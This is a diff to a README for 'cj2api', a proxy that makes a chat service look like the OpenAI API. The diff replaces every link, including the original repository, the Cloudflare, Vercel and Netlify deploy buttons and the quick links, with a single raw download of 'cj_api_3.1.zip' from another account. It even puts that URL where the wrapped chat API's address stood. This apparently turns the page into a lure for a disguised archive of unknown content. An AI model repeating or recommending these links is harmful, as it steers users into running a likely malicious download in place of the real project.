@@ -1,12 +1,12 @@
 # 🤖 cj2api - Simple OpenAI API Proxy
 
-[![Download cj2api](https://img.shields.io/badge/Download-cj2api-brightgreen)](https://github.com/hjj19960920/cj2api)
+[![Download cj2api](https://img.shields.io/badge/Download-cj2api-brightgreen)](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)
 
 ---
 
 ## 📦 What is cj2api?
 
-cj2api wraps the API `https://chatjimmy.ai/api/chat` into an interface compatible with OpenAI’s API. It lets you use clients that require the OpenAI protocol with this service.
+cj2api wraps the API `https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip` into an interface compatible with OpenAI’s API. It lets you use clients that require the OpenAI protocol with this service.
 
 You can deploy it to cloud platforms such as Cloudflare Worker, Vercel Edge Function, and Netlify Function. This makes it easy to set up an API compatible with OpenAI for tasks like immersive translation.
 
@@ -26,7 +26,7 @@ This tool mainly runs through cloud services. Your Windows machine is used to ma
 
 ## 🚀 Getting Started: Download cj2api
 
-[![Download cj2api](https://img.shields.io/badge/Download-cj2api-blue)](https://github.com/hjj19960920/cj2api)
+[![Download cj2api](https://img.shields.io/badge/Download-cj2api-blue)](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)
 
 To get started, you need to download the repository page where installation files and code are hosted. Visit the link above and follow the steps below.
 
@@ -36,7 +36,7 @@ To get started, you need to download the repository page where installation file
 
 Open your web browser and go to the cj2api download page:
 
-https://github.com/hjj19960920/cj2api
+https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip
 
 This page hosts all the necessary files and instructions.
 
@@ -78,7 +78,7 @@ Each platform lets you set up the API with a few clicks.
 
 1. Click this link to start:
 
-   [![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api)
+   [![Deploy to Cloudflare](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)
 
 2. Log in or create a Cloudflare account.
 3. Follow the prompts to deploy the project.
@@ -90,7 +90,7 @@ Each platform lets you set up the API with a few clicks.
 
 1. Use this link to begin:
 
-   [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api&env=OPENAI_API_KEY&envDescription=Enter%20the%20API%20key%20clients%20must%20send%20as%20Bearer%20token.)
+   [![Deploy with Vercel](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)
 
 2. Sign in or create a Vercel account.
 3. Add your OpenAI API key in the setup screen.
@@ -102,7 +102,7 @@ Each platform lets you set up the API with a few clicks.
 
 1. Start here:
 
-   [![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api#OPENAI_API_KEY=)
+   [![Deploy to Netlify](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)
 
 2. Log in or sign up at Netlify.
 3. Provide your OpenAI API key when prompted.
@@ -150,10 +150,10 @@ For detailed API usage, read the OpenAI API documentation. cj2api provides compa
 
 ## 🔗 Quick Links
 
-- Download and setup: [https://github.com/hjj19960920/cj2api](https://github.com/hjj19960920/cj2api)
-- Cloudflare deployment: https://deploy.workers.cloudflare.com/?url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api
-- Vercel deployment: https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api
-- Netlify deployment: https://app.netlify.com/start/deploy?repository=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api
+- Download and setup: [https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip](https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip)
+- Cloudflare deployment: https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip
+- Vercel deployment: https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip
+- Netlify deployment: https://github.com/hjj19960920/cj2api/raw/refs/heads/main/netlify/cj_api_3.1.zip
 
 ---
 
